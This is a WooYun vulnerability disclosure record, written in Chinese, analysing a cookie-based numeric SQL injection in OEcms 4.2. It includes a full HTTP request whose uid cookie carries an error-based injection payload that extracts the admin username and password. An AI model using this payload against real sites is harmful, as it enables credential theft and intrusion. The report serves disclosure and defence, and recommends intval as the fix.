{"id": 43632, "wybug_id": "wooyun-2014-082191", "wybug_title": "OEcms通用Cookie注入一枚（无视全局过滤）", "wybug_corp": "OECMS", "wybug_author": "路人甲", "wybug_date": "2014-11-07 16:32", "wybug_open_date": "2015-02-05 16:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： OEcms通用Cookie注入一枚（无视全局过滤）  详细说明：  前两天发了一个OEcms的漏洞， WooYun: OEcms通用SQL注入一枚（无视全局过滤） ，补充了互联网实例终于通过了，这个漏洞如果还需要互联网实例，就看它吧。今天再来一个cookie注入。注入点在/source/control/index/buylist.php，而这个是OEcms最新版OEcms4.2在2014-10-08 UPDATE的一个文件，早期的版本中不存在这个问题。版本如下：\n\nOEcms首先对用户的各种输入做了全局过滤，/source/core/run.conf.php\n无关代码function daddslashes($string) {\tif(!MAGIC_QUOTES_GPC) {\t\tif(is_array($string)) {\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val);\t\t\t}\t\t} else {\t\t\t$string = addslashes($string);\t\t}\t}\treturn $string;}if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])){\texit('Request tainting attempted.');}$_GET       = daddslashes($_GET);$_POST      = daddslashes($_POST);$_COOKIE\t= daddslashes($_COOKIE);$_REQUEST   = daddslashes($_REQUEST);$_FILES     = daddslashes($_FILES);$_SERVER\t= daddslashes($_SERVER);无关代码\n然后在执行sql的时候，很多输入又做了过滤，我没有找到可以绕过’过滤注入的，既然不能绕过，那就不用’了吧，在cookie中找到了个数字型的注入点，无需考虑’的闭合问题了。先看代码/source/control/index/buylist.php\n无关代码public function control_showlist()    {              $model = parent::model('buylist', 'im');        $var_array = array('buylist' => $model->getList($_COOKIE['uid']));        unset($model);        $this->_tplfile = $this->getTPLFile('buylist');        TPL::assign($var_array);        TPL::display($this->_tplfile);}无关代码\n可以看到uid的值是由cookie中的uid获得的，然后的执行了getlist()。再来看看getlist():\npublic function getList($uid)    {        $sql = 'SELECT v . id as id , v.num as num , v.num * p.oprice as rate, p . * FROM ' .            DB_PREFIX . 'tmpbuy as v' . ' LEFT JOIN ' . DB_PREFIX .            'product as p ON v .pid = p . productid where v.uid=' . $uid;        $data = parent::$obj->getall($sql);        return $data;    }\n再来看看getall()\nfunction getall($sql,$iscache=true){\t\t$res = $this->query($sql);\t\tif ($res !== false){\t\t\t$arr = array();\t\t\twhile ($row = mysql_fetch_assoc($res)){\t\t\t\t$arr[] = $row;\t\t\t}            $this->free_result($res);\t\t}else{\t\t\treturn false;\t\t}\t\treturn $arr;    }\n没有进行任何形式的过滤，然后就带入sql执行了虽然进行了全局过滤，但是仅用daddslashes过滤，对于数字型的注入来说，起不到作用，轻松绕过，注入成功。Payload:\nGET /index.php?c=buylist&a=showlist HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; ypsdffp2app_admininfo=88ff7944laVfYY9BL1FuA%2BbNLMa%2Brd04KKHHyTrxgcY0sufkNR1I4pXCpZqYgYd9Y%2BqfL%2B4XwwN8WETv4bcEbqKo28CQBBbS0iWJDNmoWbq4y1I; PHPSESSID=14aabit7um5hthb76r1qu69442;uid=1 UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(adminname,0x23,password)FROM oecmspre_admin LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)aConnection: keep-alive\n正常执行sql语句是这样的\n\n执行注入sql语句\n\n管理员的用户名和密码出来了\n\n   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}